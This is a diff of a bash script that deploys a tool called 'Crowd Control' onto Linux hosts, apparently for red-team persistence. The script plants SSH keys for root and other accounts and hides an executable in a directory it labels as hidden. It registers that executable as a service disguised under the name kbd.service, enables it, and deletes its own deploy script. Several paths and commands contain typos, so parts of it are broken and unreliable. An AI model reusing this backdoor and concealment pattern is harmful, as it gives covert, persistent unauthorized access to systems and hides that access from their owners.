@@ -1,4 +1,5 @@
 #!/bin/bash
+# this script deploys ssh keys and Crowd Control to linux distributions 
 
 #deploying ssh keys to root, User1, and User2
 #need to alter User1 and User2 to actual usernames before using
@@ -24,8 +25,9 @@ rm -f /home/pubkey
 mkdir /media/driver0/ # directory to hide the executable
 touch /media/driver0/crowdcontrol.py # the executable file
 
+# assumes that crowdcontrol.py and crowdcontrol.service exist in the /home directory
 mv /home/crowdcontrol.py /medida/driver0/crowdcontrol.py
-mv /home/crowncontrol.servce /etc/system/systemd/kbd.service
+mv /home/crowdcontrol.servce /etc/system/systemd/kbd.service
 
 chmod +x /medida/driver0/crowdcontrol.py
 systemctl daemon-reload
@@ -33,4 +35,6 @@ systemctl start kbd
 systemtctl enable kbd
 systemctl status kbd
 
+# no clean up necesarry for CrowdControl Deploy
+rm -f ../easydeploy.sh
 
